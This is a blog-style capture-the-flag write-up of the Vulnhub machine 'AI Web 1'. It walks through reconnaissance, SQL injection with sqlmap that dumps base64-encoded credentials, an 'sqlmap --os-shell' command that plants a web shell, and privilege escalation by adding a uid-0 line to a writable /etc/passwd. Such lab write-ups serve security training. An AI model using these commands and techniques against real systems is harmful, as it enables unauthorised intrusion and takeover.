---
layout: post
title: AI Web 1
date: 2019-09-12
author: OutHackThem
comments: true
categories: vulnhub
tags: [ctf,vulnhub]
---

## AI Web 1 Vulnhub

After configuring the AI Web vm and getting its ip through  netdocover. I quicky ran a nmap scan and saw that only port 80 was open. This shows that the challenge was purely web based.

I then ran a directory bruteforcer and found robots.txt 

![robots_txt]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/aiweb1/robots.png)


So now we have 2 more directories I further tried bruteforcing them and found a phpinfo file under

[http://192.168.114.134/m3diNf0/info.php](http://192.168.114.134/m3diNf0/info.php)


That was all I could find in the `m3diNf0` directory. Now moving on to the other directory.

Navigating to [http://192.168.114.134/se3reTdir777/](http://192.168.114.134/se3reTdir777/)

You see that there is a form that displays the usenames by taking in user id


![view users]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/aiweb1/ulookup.png)

I intercepted the HTTP post request and tried looking for a sqli and turns out that it was vulnerable.

I copied the HTTP POST request from burp interceptor proxy and then quickly started sqlmap. 


![post req]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/aiweb1/postreq.png)



and following is what I found


```bash

Database: aiweb1                                                                                                              
Table: systemUser                                                                                                             
[3 entries]                                                                                                                   
+----------------------------------------------+-----------+                                                                  
| password                                     | userName  |                                                                  
+----------------------------------------------+-----------+                                                                  
| RmFrZVVzZXJQYXNzdzByZA==                     | t00r      |                                                                  
| TjB0VGhpczBuZUFsczA=                         | u3er      |                                                                  
| TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn |                                                                  
+----------------------------------------------+-----------+                                                                  
                                                               
```

The passwords are base64 encoded.

I did not find anything further on the web page or in the directories so I thought to try to write a shell in one of the directoires of the website using sqli. 

So the quickest and easiest option was sqlmap


```bash
sqlmap -r req.txt -p uid --os-shell
```


It then asks you to choose a directory of where you will upload the shell for this we need the complete path from home of the web root. This is where it gets fun, remember that little phpinfo file we found earlier ? yup that comes in to play now 


![phpinfo path]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/aiweb1/phpinfo_path.png)


just copy paste that path and you will have your self a nice little shell 


![from sql to shell]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/aiweb1/sql_shell.png)


Now I like to work in the command line to elavate my privileges and besides a tty shell comes with many advantages.
So I got  a reverse shell and started searching around.

I first started listing files owned by the current web user and to my luck I found that /etc/passwd was owned by the current user.


```bash
ls -la /etc/passwd
-rw-r--r-- 1 www-data www-data 1655 Sep 10 20:10 /etc/passwd
```

Now we can edit /etc/passwd from our web user

following is the change I made 


aiweb1pwn:x:0:0:root:/root:/bin/bash

As you might remember the password for the user `aiweb1pwn` was found from the sql injection  decoding the base64 password and logging in with that user will give us a root shell


![from sql to shell]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/aiweb1/root.png)